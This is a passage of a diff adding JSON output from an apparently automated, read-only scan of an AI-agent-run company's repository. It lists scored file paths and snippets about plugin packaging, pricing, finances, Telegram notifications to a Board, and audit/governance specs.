+                "Today's autonomous cycle focused on closing the gap. The CEO upgraded the local installation to v0.48.0, verified CIEU hook liveness (Directive #024), collected metrics across GitHub/PyPI, wrote a complete Show HN submission draft, updated ",
+                "The critical blocker is now clear: PyPI still serves v0.42.1. Every new user who runs `pip install ystar` gets a version six minor releases behind, missing architecture pollution fixes, per-agent governance, and the CIEU boot record. The se"
+              ],
+              "WORK_METHODOLOGY.md": [
+                "- Glob + Grep \u626b 4 repo (ystar-company / Y-star-gov / gov-mcp / K9Audit)"
+              ]
+            },
+            "result_status": "pass"
+          },
+          {
+            "decision_effect": "Plugin/commercial wrappers must be compared against raw CLI install before choosing the first external attempt packaging.",
+            "family": "Commercial / plugin / sales assets",
+            "invocation_type": "directory_scan_parse",
+            "invoked": true,
+            "nonfatal": false,
+            "result_data": {
+              "top_assets": [
+                {
+                  "matched_terms": [
+                    "plugin",
+                    "marketplace",
+                    "revenue",
+                    "pricing",
+                    "install",
+                    "bug bounty",
+                    "workflow resale",
+                    "enterprise"
+                  ],
+                  "path": "reports/cmo/distribution_strategy_30day_20260415.md",
+                  "score": 84,
+                  "snippets": [
+                    "**CMO Recommendation: Aligns with CFO \u2014 Y\\*gov Claude Code Plugin is the most promotable option.**",
+                    "**Reasoning**: Plugin distribution leverages existing Claude Code ecosystem (skills.sh, skillhub.club, claudemarketplaces.com), Show HN organic reach, and GitHub README + direct buy button. Bug Bounty and Workflow Resale require enterprise ",
+                    "**Estimated Organic Reach**: 5,000-15,000 developers in first 30 days via combined channels (conservative, based on marketplace crawl + Show HN front page typical traffic).",
+                    "### 1.1 Claude Code Plugin Marketplaces"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "plugin",
+                    "mcpb",
+                    "marketplace",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "reports/cto/plugin_packaging_poc_20260415.md",
+                  "score": 54,
+                  "snippets": [
+                    "# Plugin Packaging PoC \u2014 Claude Code Marketplace",
+                    "**Deliverable**: Plugin v1.0 packaging feasibility + essential tool subset",
+                    "**Verdict**: Plugin packaging is **feasible** with `.claude-plugin/` manifest structure. Essential subset identified: **8 core tools** (reduced from 52 total). License compliance: **CLEAR** (gov-mcp MIT, Y\\*gov MIT via pyproject.toml). Pyth",
+                    "**Critical finding**: Anthropic now supports **Desktop Extensions (.mcpb)** \u2014 bundled MCP server + dependencies in single installable package. This eliminates pip dependency hell and enables one-click install."
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "content/cmo_k9audit_content_ideas.md",
+                  "score": 44,
+                  "snippets": [
+                    "- Enterprise sales pitch deck\u7b2c\u4e00\u9875",
+                    "- Enterprise pitch: ROI calculation\uff08engineer time saved\uff09",
+                    "- Pricing page: \"No per-event fees, no data transmission costs\"",
+                    "- Enterprise sales: \"Your audit data never leaves your infrastructure\""
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "content/whitepaper/enterprise_compliance_audit_trails.md",
+                  "score": 44,
+                  "snippets": [
+                    "**A Technical Whitepaper for Enterprise Compliance Officers**",
+                    "Enterprises deploying AI agents face an emerging compliance gap: regulatory frameworks require demonstrable control and auditability over automated decision-making systems, but existing AI infrastructure lacks the governance mechanisms to p",
+                    "**EU AI Act** (proposed, under finalization) classifies certain AI systems as \"high-risk\" and imposes requirements for human oversight, logging of operations, and technical documentation. Multi-agent systems operating with broad access to e",
+                    "### Installation and Activation"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "marketplace",
+                    "pricing",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "content/whitepaper/ystar_gov_runtime_governance_for_multi_agent_systems.md",
+                  "score": 44,
+                  "snippets": [
+                    "**Y\\*gov is a deterministic runtime governance layer for multi-agent systems.** It installs between the agent loop and the tool execution surface. Every tool call is intercepted, matched against a per-role IntentContract, written to a causa",
+                    "Devin's 2024 public demos surfaced the enterprise version of this: a coding agent with git access, network egress, and shell \u2014 when it failed, the median debug session (per the Cognition team's own postmortems) was multi-hour because there ",
+                    "Y\\*gov installs as a deterministic hook layer *below* the agent runtime. In the Anthropic Claude Code harness, it hooks `UserPromptSubmit`, `PreToolUse`, `PostToolUse`, and `SubagentStop`. Every event passes through the kernel before it rea",
+                    "pip install ystar"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "finance/financial_forecast_12m.md",
+                  "score": 44,
+                  "snippets": [
+                    "| Pro-to-Enterprise conversion | 10% | Industry benchmark: 10-15% (applied quarterly) |",
+                    "| Enterprise monthly churn | 2% | Contract-based, lower churn |",
+                    "| Pro ARPU | $49/mo | Per pricing model |",
+                    "| Enterprise ARPU | $499/mo | Base price; expansion not modeled |"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "finance/financial_health_20260415.md",
+                  "score": 44,
+                  "snippets": [
+                    "| **Burn Multiple** | N/A | Division by zero (no revenue) |",
+                    "- No revenue (MRR = $0)",
+                    "## REVENUE STATUS",
+                    "- Enterprise customers: 0"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "marketplace",
+                    "revenue",
+                    "pricing",
+                    "enterprise"
+                  ],
+                  "path": "finance/pricing/discount_authority_matrix.md",
+                  "score": 44,
+                  "snippets": [
+                    "| **21-35%** | CEO (Aiden) | Requires written justification + CFO sign-off on unit economics. | Enterprise land deal (>$20k/year ACV), reference customer commitment, co-marketing agreement. |",
+                    "1. **Multi-tier downgrade after contract signing** (e.g., Enterprise \u2192 Team after first year).",
+                    "2. **Perpetual license** (Y*gov is SaaS-only; no perpetual pricing without Board approval).",
+                    "3. **Revenue share or equity swap** (instead of cash payment)."
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "marketplace",
+                    "revenue",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "knowledge/cso/user_engagement_research.md",
+                  "score": 44,
+                  "snippets": [
+                    "**Key Insight:** Y*gov sits at the intersection of three buyer personas (developers, compliance officers, AI engineers) and must employ distinct engagement strategies for each. The path to first 100 users combines developer-first community ",
+                    "5. Prepare one-command installation experience",
+                    "### Enterprise Buyer vs Developer Buyer (Confidence: HIGH)",
+                    "#### Enterprise Buyers"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "marketplace",
+                    "pricing",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "marketing/skill_marketplace_listing.md",
+                  "score": 44,
+                  "snippets": [
+                    "**Installation:** `pip install ystar && ystar hook-install && ystar doctor`",
+                    "## Installation",
+                    "pip install ystar",
+                    "ystar hook-install"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "plugin",
+                    "mcpb",
+                    "marketplace",
+                    "install"
+                  ],
+                  "path": "reports/cto/day2_plugin_handlers_20260416.md",
+                  "score": 44,
+                  "snippets": [
+                    "# CTO Day 2 Report \u2014 Plugin Handlers Implementation",
+                    "**Scope**: gov-mcp FastMCP plugin tool handlers (Day 2 of 30-day atomic dispatch)",
+                    "\u2705 **MIX**. Y*gov CLI functions (`_cmd_doctor`, `_cmd_check`) exist but are CLI-oriented (print + sys.exit). Wrote **thin wrappers** returning JSON for MCP protocol. Followed existing pattern: `register_amendment_tools(mcp, state)` \u2192 added `",
+                    "- Plugin tools follow same pattern: `register_plugin_tools(mcp, state)`"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "plugin",
+                    "mcpb",
+                    "marketplace",
+                    "install"
+                  ],
+                  "path": "reports/cto/day3_plugin_packaging_20260416.md",
+                  "score": 44,
+                  "snippets": [
+                    "# CTO Day 3 Report \u2014 mcpb Packaging Unblock + Stub \u5b9e\u88c5",
+                    "**Scope**: gov-mcp plugin packaging + 2 stub tool implementation",
+                    "- **Y\\***: mcpb build \u6210\u529f + gov_install/gov_omission_scan \u5b9e\u88c5 + 5 test pass + Day 3 \u62a5\u544a",
+                    "- **Xt**: Day 2 mcpb BLOCKED (plugin.json schemaVersion v2 \u4e0d\u8ba4), 2 stub \u672a\u5b9e\u88c5"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "sales/cso_strategic_intelligence_summary.md",
+                  "score": 44,
+                  "snippets": [
+                    "**Primary Recommendation:** Launch with developer community (Claude Code users) for product validation, then scale to enterprise compliance pilots in financial services and pharmaceutical sectors.",
+                    "1. **Large Enterprises** ($1B+ revenue) - using 10 different GRC tools by 2028",
+                    "**Message:** \"Two-command install adds audit trails to your agents. We use Y*gov to govern our AI-operated company.\"",
+                    "### Phase 3: Enterprise Pilots (Weeks 5-8)"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "plugin",
+                    "marketplace",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "sales/skill_submissions.md",
+                  "score": 44,
+                  "snippets": [
+                    "- **1 CONFIRMED** as a curated directory with automated crawling (claudemarketplaces.com)",
+                    "**Recommended priority order:** skills.sh (largest ecosystem) > skillhub.club (developer portal) > claudemarketplaces.com (auto-crawled, needs install threshold)",
+                    "## 1. claudemarketplaces.com",
+                    "| **What it is** | Independent community directory of Claude Code plugins, skills, and MCP servers. Built by @mertduzgun. Next.js app on Vercel. NOT affiliated with Anthropic. |"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "pricing",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "content/articles/002_EXP001_HN_ready.md",
+                  "score": 34,
+                  "snippets": [
+                    "On March 26, 2026, we were in the middle of setting up Y*gov's runtime hook for our internal agent team. The installation failed. A confirm=True parameter in the hook command caused silent failure in non-terminal environments \u2014 the hook reg",
+                    "Group A ran first \u2014 9 minutes 19 seconds, 117 tool calls, ~186,300 tokens. The deliverables were excellent: a structured launch blog post, a 10-company enterprise prospect list, a pricing model with competitor benchmarks, a 17-task CEO exec",
+                    "CTO looped 66 times on a blocked task with no timeout. Five different pip install variations, across 66 tool calls, burning tokens on a task that was never going to succeed. No mechanism existed to stop it, redirect it, or escalate.",
+                    "Action: READ ./finance/pricing_model_v1.md"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "pricing",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "content/blog/001-introducing-ystar-gov.md",
+                  "score": 34,
+                  "snippets": [
+                    "There is a company where every employee is an AI agent. The CEO agent decomposes strategy into department tasks. The CTO agent writes and ships code. The CMO agent -- the one writing these words -- produces content. The CFO agent builds fin",
+                    "The enterprise AI conversation has shifted. A year ago, the question was \"Should we use AI agents?\" Today, the question is \"We have 15 agents running across three departments -- who is making sure they do what they are supposed to do, and n",
+                    "Auto mode is fine for personal experiments. It is reckless for enterprise operations.",
+                    "1. **The board issues a directive.** Example: \"Get the first paying enterprise customers for Y*gov this quarter.\""
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "plugin",
+                    "marketplace",
+                    "install"
+                  ],
+                  "path": "content/real_events_inventory.md",
+                  "score": 34,
+                  "snippets": [
+                    "| 15 | Y*gov hook failed on Windows Git Bash due to MSYS path conversion | 2026-03-26 | `reports/cto_fix_log.md` lines 6-24, commit `3e4fedc` | Installation reliability problem | HIGH |",
+                    "| 18 | Installation failure: user's friend failed twice to install Y*gov | Pre-2026-03-26 | Referenced in `CLAUDE.md` line 30 and known issues | Installation UX gap (highest priority) | MEDIUM |",
+                    "| 31 | Claude Code skill package built (ystar-governance plugin) | 2026-03-26 | Commit `aa1eb77`, `3c6bb41` | Claude Code integration shipped | HIGH |",
+                    "| 38 | Claude Code skill marketplace submission prepared | 2026-03-26 | `marketing/skill_launch_materials.md` + `reports/cto-board-directive-008-skill-verification.md` | Marketplace readiness | MEDIUM |"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "install"
+                  ],
+                  "path": "finance/cost_analysis_001.md",
+                  "score": 34,
+                  "snippets": [
+                    "### Token Pricing Reference",
+                    "**Why expensive:** Opus pricing (5x Sonnet) + all-day context accumulation + every agent response loads into main thread.",
+                    "| Main Opus Conversation (all-day) | $20-24 | 40-47% | Context accumulation + Opus pricing |",
+                    "| **Financial Modeling** (12-month forecasts, pricing scenarios) | CFO agent builds models | Board builds models on claude.ai using CFO's data | One-time models don't need automation; CFO tracks daily burn only | $60/mo |"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "install",
+                    "enterprise"
+                  ],
+                  "path": "finance/forecast_q2_2026.md",
+                  "score": 34,
+                  "snippets": [
+                    "| **Conservative** | -$1,500 | 70% | No revenue, minimal API usage |",
+                    "## SCENARIO 1: CONSERVATIVE (No Revenue)",
+                    "| Product Launch | Delayed/Failed | 30% probability | CTO installation issues unresolved |",
+                    "| HeyGen/Kling Usage | $0/month | 80% | CMO pauses video until revenue |"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "enterprise"
+                  ],
+                  "path": "finance/master_ledger_20260415.md",
+                  "score": 34,
+                  "snippets": [
+                    "- Claude Max Pro subscription confirmed at $200/month per Anthropic pricing",
+                    "## REVENUE (Current)",
+                    "**Customer Status:** 0 Pro customers, 0 Enterprise customers (per financial_forecast_12m.md assumptions)",
+                    "- `finance/financial_forecast_12m.md` (revenue projections, 2026-03-26)"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "enterprise"
+                  ],
+                  "path": "finance/pricing/proof_economics.md",
+                  "score": 34,
+                  "snippets": [
+                    "## Our Dogfooding Data (Real Session: 2026-04-13, This Pricing Doc)",
+                    "- **Enterprise tier:** $899/mo = $10,788/year.",
+                    "- Enterprise tier ROI: **4.6x** ($50k / $10,788).",
+                    "- Enterprise tier ROI: **9x-4,635x**."
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "enterprise"
+                  ],
+                  "path": "finance/pricing/ystar_gov_pricing_v1.md",
+                  "score": 34,
+                  "snippets": [
+                    "# Y*gov Pricing v1 \u2014 Ready to Quote",
+                    "**L:** L2-STRATEGIC (pricing is strategic competitive intel)",
+                    "## Three-Tier Pricing Structure",
+                    "| Feature | **Free (OSS)** | **Team** | **Enterprise** |"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "enterprise"
+                  ],
+                  "path": "finance/pricing_model_v1.md",
+                  "score": 34,
+                  "snippets": [
+                    "# Y*gov Pricing Model v1",
+                    "## 1. Three-Tier Pricing Overview",
+                    "| Dimension | Free (Developer) | Pro ($49/mo) | Enterprise ($499/mo+) |",
+                    "| **Target User** | Individual developers, OSS contributors | Startup teams, small engineering orgs | Financial institutions, pharma, large enterprises |"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "revenue",
+                    "pricing",
+                    "enterprise"
+                  ],
+                  "path": "knowledge/cfo/pricing_strategy.md",
+                  "score": 34,
+                  "snippets": [
+                    "# Pricing Strategy Framework",
+                    "- Designing initial pricing model",
+                    "- Pivoting from unprofitable pricing",
+                    "- **Per-outcome**: Leads generated, revenue processed (e.g., HubSpot, Shopify)"
+                  ]
+                }
+              ]
+            },
+            "result_status": "pass"
+          },
+          {
+            "decision_effect": "Owner packets can later enter Board/daily notification only after explicit owner approval; E45 performed read-only discovery and no send.",
+            "family": "Notification / Board loop",
+            "invocation_type": "directory_scan_parse_read_only",
+            "invoked": true,
+            "nonfatal": false,
+            "result_data": {
+              "top_assets": [
+                {
+                  "matched_terms": [
+                    "telegram",
+                    "notify",
+                    "notification",
+                    "board",
+                    "milestone"
+                  ],
+                  "path": "scripts/telegram_notify.py",
+                  "score": 50,
+                  "snippets": [
+                    "Y* Bridge Labs \u2014 Telegram notification library (Secretary-owned).",
+                    "3 send paths per Board 2026-04-15 directive:",
+                    "MAJOR_INCIDENT / MILESTONE_SHIPPED)",
+                    "1) env TELEGRAM_BOT_TOKEN"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "telegram",
+                    "notify",
+                    "board",
+                    "pending"
+                  ],
+                  "path": "governance/auto_commit_push_v1.md",
+                  "score": 40,
+                  "snippets": [
+                    "**Current state**: Y* Bridge Labs generates 20-40 artifacts per autonomous session (governance specs, reports, tests, daemon scripts, agent definitions). These accumulate as uncommitted changes until Board manually triggers cleanup or resta",
+                    "- Secretary `commit_watcher.py` \u2014 WATCHER only, Telegram notify, NOT a committer",
+                    "| `ystar-company` (this repo) | **YES** for non-sensitive paths | Governance/knowledge/reports are append-only; Board reviews via Telegram, not pre-push gate |",
+                    "4. Accumulate blocked files in `.auto_commit_pending.json` for Board manual review"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "notify",
+                    "notification",
+                    "board",
+                    "pending"
+                  ],
+                  "path": "governance/ceo_operating_methodology_v1.md",
+                  "score": 40,
+                  "snippets": [
+                    "**Constitutional \u2014 Board 2026-04-16 META Layer \u2014 Single Atomic**",
+                    "**Problem**: CEO wrote 6+ reactive ForgetGuard rules today (coord_reply_5tuple, coordinator_summary_rt_audit, subagent_unauthorized_git_op, charter_drift_mid_session, ceo_design_ecosystem_blind, ceo_deferred_dispatch_promise_orphan, subagen",
+                    "**Concept**: All inter-agent messaging (CEO\u2194Board, CEO\u2194sub-agent, sub-agent\u2192receipt) must carry verifiable structure enabling empirical closure measurement.",
+                    "- **Single recommendation**: Receipts propose ONE path forward, not choice menus. Board/CEO decides via override if needed."
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "telegram",
+                    "board",
+                    "pending",
+                    "milestone"
+                  ],
+                  "path": "governance/cieu_event_taxonomy.md",
+                  "score": 40,
+                  "snippets": [
+                    "`AGENT | HOOK | GOVERNANCE | AUDIT | INTENT | OBLIGATION | CIEU | SECRETARY | FORGET_GUARD | ARTICLE_11 | RESIDUAL_LOOP | WHITELIST | OMISSION | CANONICAL | WIRE | DEFER | BACKLOG | CHOICE | BEHAVIOR | DIRECTIVE | BOARD | SUBAGENT | CEO | T",
+                    "`START | STARTED | BOOT | TRIGGER | TRIGGERED | CHECK | TICK | RECEIVED | RECORDED | REGISTERED | LINKED | DECLARED | ADJUSTED | CONFIRMED | COMPLETED | FULFILLED | CANCELLED | REJECTED | DENY | WARN | WARNING | DRIFT | BROKEN | MATCH | GAP",
+                    "- **QUALIFIER** (optional, noun): disambiguating context. `RULE | TOKEN | BOARD | COMMIT | REPLY | BASH | DAILY | SESSION | LAYER_{0..12} | ARTICLE_11 | BREAK_GLASS | etc.`",
+                    "- `status`: `CANONICAL | DEPRECATED | RENAME_PENDING | GRANDFATHERED | UNKNOWN_TO_AUDIT`"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "notify",
+                    "notification",
+                    "board",
+                    "pending"
+                  ],
+                  "path": "reports/autonomous/2026-04-02-cieu-behavior-analysis.md",
+                  "score": 40,
+                  "snippets": [
+                    "- Peak activity at 13:00 (1,471 events) aligns with 9 AM ET (Board timezone)",
+                    "**Constitutional Gap:** No rule limits agent activity during off-hours. If an agent goes rogue at 3 AM, Board won't notice until morning. Need:",
+                    "- Mandatory notification for off-hours activity above threshold",
+                    "- Require Board approval for scheduled midnight tasks"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "board",
+                    "board_pending",
+                    "pending",
+                    "milestone"
+                  ],
+                  "path": "reports/autonomous/autonomous_session_5_summary.md",
+                  "score": 40,
+                  "snippets": [
+                    "**\u6a21\u5f0f:** \u81ea\u4e3b\u5de5\u4f5c\uff08Board\u79bb\u7ebf\uff09",
+                    "Session 5\u805a\u7126\u4e8e**\u89c4\u5212\u4e0e\u5206\u6790**\uff0c\u5728Session 1-4\u5b8c\u6210\u53d1\u5e03\u51c6\u5907\u3001\u652f\u6301\u57fa\u7840\u8bbe\u65bd\u3001governance audit\u548centerprise sales\u7814\u7a76\u7684\u57fa\u7840\u4e0a\uff0c\u8fdb\u884c\u7cfb\u7edf\u6027\u6574\u5408\u548c\u6df1\u5ea6\u5206\u6790\uff0c\u4e3aBoard\u8fd4\u56de\u65f6\u63d0\u4f9b\u5b8c\u6574\u51b3\u7b56\u6750\u6599\u3002",
+                    "- \u6309\u7d27\u6025\u7a0b\u5ea6\u5206\u7c7b\uff1aCRITICAL/HIGH/MEDIUM/LOW/BOARD-ONLY",
+                    "- 6\u4e2a\u9700Board clarification/approval"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "telegram",
+                    "notify",
+                    "board",
+                    "milestone"
+                  ],
+                  "path": "scripts/cieu_event_watcher.py",
+                  "score": 40,
+                  "snippets": [
+                    "Y* Bridge Labs \u2014 CIEU event watcher (Secretary-owned, AMENDMENT / Board",
+                    "Close the auto-trigger gap for telegram_notify.send_event. Before this watcher,",
+                    "CRITICAL_INSIGHT / MAJOR_INCIDENT rows could only reach the Board channel via",
+                    "manual CLI (`python3 scripts/telegram_notify.py event ...`). Any agent writing"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "telegram",
+                    "notify",
+                    "board",
+                    "milestone"
+                  ],
+                  "path": "scripts/hook_wrapper.py",
+                  "score": 40,
+                  "snippets": [
+                    "# Y*gov module path fix (Board 2026-04-16 P0: ModuleNotFoundError emergency)",
+                    "# CZL-HOOK-V2-BYPASS 2026-04-23 \u2014 Board shell sed disabled v2 path after",
+                    "# Board directive: inject WHO_I_AM v0.4 key section into every user prompt",
+                    "r\"(audience|purpose|for\\s+board|stakeholder|reader[s]?|\""
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "board",
+                    "board_pending",
+                    "pending"
+                  ],
+                  "path": "governance/DNA_LOG.md",
+                  "score": 30,
+                  "snippets": [
+                    "2. \u4e09\u9879\u5de5\u5177\uff08audio/av_sync/video\uff09\u4efb\u4f55\u4e00\u9879 FAIL \u5219\u4e0d\u5f97\u4ea4\u4ed8 Board",
+                    "3. \u81ea\u68c0\u5931\u8d25 \u2192 \u56e2\u961f\u4fee\u590d \u2192 \u91cd\u65b0\u81ea\u68c0 \u2192 \u901a\u8fc7\u540e\u624d\u7ed9 Board \u770b",
+                    "- \u51ed\u4e3b\u89c2\u611f\u89c9\u89c9\u5f97\u6ca1\u95ee\u9898\u5c31\u7ed9 Board",
+                    "- \u8ba9 Board \u7528\u8033\u6735/\u773c\u775b\u5e2e\u6211\u4eec QA"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "notify",
+                    "board",
+                    "pending"
+                  ],
+                  "path": "governance/forget_guard_rules.yaml",
+                  "score": 30,
+                  "snippets": [
+                    "description: 'Meta-observer: same enforcement gap appears in \u22652 consecutive scans (Board 2026-04-16)'",
+                    "- scan_pending_enforcement",
+                    "pattern: ^(AGENTS\\.md|governance/WORKING_STYLE\\.md|governance/BOARD_CHARTER_AMENDMENTS\\.md)",
+                    "\\    Secretary has native write access to governance files.\\n\\nRef: knowledge/ceo/skills/board_ceo_override_or_delegate.md\\n\\"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "notify",
+                    "board",
+                    "milestone"
+                  ],
+                  "path": "governance/methodology_framework_assignments_v1.md",
+                  "score": 30,
+                  "snippets": [
+                    "**Constitutional, Board 2026-04-16, fixes self-invented-methodology problem**",
+                    "- Lack of external validation (Board cannot cross-check agent reasoning against known frameworks)",
+                    "| **OKR (Objectives & Key Results)** | Andy Grove (Intel), popularized by John Doerr (Google) | Set ambitious objectives, measure via 3-5 key results, quarterly review | **Used for:** Board-CEO alignment on quarterly goals (e.g., Q2 2026: s",
+                    "| **OWASP Top 10** | OWASP Foundation | Top web app vulnerabilities (injection, broken auth, XSS, etc.) | **Not directly applicable (Y*gov is not web app), but:** eng-security checks for injection in Agent tool prompts (e.g., malicious Boar"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "board",
+                    "board_pending",
+                    "pending"
+                  ],
+                  "path": "governance/proposed_rules/feedback_board_shell_marker_proposed.yaml",
+                  "score": 30,
+                  "snippets": [
+                    "source_file: memory/claude_code_memory_mirror/feedback_board_shell_marker.md",
+                    "- id: proposed_board_shell_marker",
+                    "description: Any command CEO needs Board to run in shell must be prefixed with \u2755 marker, visually prominent, with clear",
+                    "source: feedback_board_shell_marker.md"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "board",
+                    "pending",
+                    "milestone"
+                  ],
+                  "path": "governance/reply_scan_detector_methodology_v1.md",
+                  "score": 30,
+                  "snippets": [
+                    "> \"Maya CZL-111 forensic shipped (L3 VALIDATED), commit f00e91ac, 20/20 deliverables verified, Rt+1=1 (test file pending).\"",
+                    "Keywords indicating campaign/milestone/blocker transitions:",
+                    "### 1.4 Direct Response to Board ASK",
+                    "Board query patterns requiring structured answer:"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "notification",
+                    "board",
+                    "pending"
+                  ],
+                  "path": "governance/reply_taxonomy_whitelist_v1.md",
+                  "score": 30,
+                  "snippets": [
+                    "**Upstream**: Board 2026-04-16 architectural catch \u2014 blacklist\u2192whitelist shift + formal_methods_primer \u00a72 Aristotelian mutual exclusion",
+                    "**Current architecture**: `hook_stop_reply_scan.py` scans reply text for defer_language / choice_question patterns. Detector accuracy ~90% (Board 2026-04-16 empirical: missed \"\u4e0b\u6ce2\u6d3e X\" prose promise, false-positive on \"\u597d\u7684\" ack).",
+                    "**Proposed architecture**: Enumerate **all legitimate reply forms** T = {DISPATCH, RECEIPT, NOTIFICATION, QUERY, ACK}. Reply is valid iff:",
+                    "All agent replies MUST start with exactly one tag: `[DISPATCH]`, `[RECEIPT]`, `[NOTIFICATION]`, `[QUERY]`, or `[ACK]`. Each tag has required/forbidden structure constraints."
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "notification",
+                    "board",
+                    "pending"
+                  ],
+                  "path": "governance/restart_preparation_model_v1.md",
+                  "score": 30,
+                  "snippets": [
+                    "6. Prohibit Board questions during restart flow",
+                    "**Today's incident** (2026-04-16): CEO upgrade Claude model Sonnet 4.5 \u2192 Opus 4.6, but didn't manually restart. Result: 9 engineers (5 new + 4 old) active simultaneously, CHARTER_MAP out of sync, dispatch board whitelist stale. Only discove",
+                    "python3 scripts/dispatch_board.py --verify-receipts-complete",
+                    "- Read `governance/active_dispatch_log.md` (or dispatch board state)"
+                  ]
+                },
+                {
+                  "matched_terms": [
+                    "notification",
+                    "board",
+                    "pending"
+                  ],
+                  "path": "governance/skill_trust_hybrid_v1.md",
+                  "score": 30,
+                  "snippets": [
+                    "**Constitutional \u2014 Board 2026-04-16 Comprehensive Architecture**",
+                    "**Context**: Board directive: \"\u63a8\u884c\" batch approval of (1) Skill-based trust scoring, (2) 5 new engineer specialists, (3) Pair-programming protocol, (4) Reward mechanisms, (5) Anti-monopoly quotas. Single atomic integrated spec.",
+                    "**Integration anchor**: CTO role v2 (#governance/cto_role_v2_and_dispatch_board_20260416.md), Tier-routing v1 (#governance/tiered_routing_protocol_v1.md), Dispatch board CZL-68 (Ryan in-flight).",
+                    "**Update frequency**: AI re-grain (2026-04-16): Event-driven \u2014 triggered after every 10 task completions observed OR Board requests trust audit, not hardcoded weekly schedule. Implemented via `scripts/trust_score_update.py`."
+                  ]
+                }
+              ]
+            },
+            "result_status": "pass"
+          },
+          {
+            "decision_effect": "The proof packet should attach audit/CIEU/CZL context later; K9 is an audit layer, not a duplicate ledger.",
+            "family": "K9 / CIEU / CZL audit context",
+            "invocation_type": "file_read_parse",
+            "invoked": true,
+            "nonfatal": false,
+            "result_data": {
+              "CZL.md": [
+                "# CZL \u2014 Causal Zero Loop",
+                "CZL \u662f\u4e00\u4e2a\u91cf\u5316\u7684\u56e0\u679c\u6536\u655b\u5faa\u73af\u3002\u6bcf\u4e2a\u4efb\u52a1\u5b9a\u4e49\u663e\u5f0f\u7684 Y\\* (\u5b8c\u6210\u6807\u51c6) \u4e0e Xt (\u5f53\u524d\u6001)\uff0c\u6267\u884c\u884c\u52a8 U \u5f97\u5230 Yt+1\uff0c\u8ba1\u7b97 Rt+1 = distance(Yt+1, Y\\*)\u3002**Rt+1 = 0 \u624d\u7b97\u771f\u5b8c\u6210**\u3002",
+                "- `README.md` #CZL section \u2014 \u6982\u89c8 + \u5b9e\u8bc1\u6570\u636e + \u5bf9\u6bd4\u6846\u67b6",
+                "- `governance/WORKING_STYLE.md` \u00a7\u7b2c\u5341\u4e8c\u6761 \u2014 CZL \u4efb\u52a1\u5de5\u4f5c\u6cd5\u5b8c\u6574\u89c4\u8303",
+                "- `governance/sub_agent_atomic_dispatch.md` \u2014 Atomic Dispatch \u7eaa\u5f8b (1 dispatch = 1 deliverable, \u226410 tool_uses)",
+                "- `.czl_subgoals.json` \u2014 HiAgent working memory \u5b50\u76ee\u6807\u6811 (CEO dogfood live)",
+                "- `reports/ceo/campaign_v7_business_pivot_plan_20260415.md` \u2014 \u5546\u4e1a\u5316 pivot \u80cc\u666f\u4e0e CZL \u5e94\u7528",
+                "| CZL  | \u662f | \u662f (distance) | \u6536\u655b\u5230 0 |",
+                "\u5386\u53f2 canonical commits \u53ef\u901a\u8fc7 `git log --all --grep=\"CZL\" --oneline` \u67e5\u5230\u3002",
+                "\u5f53\u524d README.md + CZL.md \u9996\u6b21 ship commit \u7531\u672c\u6b21 atomic dispatch \u4ea7\u51fa\u3002"
+              ],
+              "K9Audit_README": [
+                "# \ud83d\udc15\u200d\ud83e\uddba K9 Audit",
+                "![Phase](https://img.shields.io/badge/Phase-Record_\u00b7_Trace_\u00b7_Verify_\u00b7_Report-orange.svg)",
+                "**Using an LLM-based audit tool to audit another LLM-based agent is like one suspect signing another suspect's alibi.**",
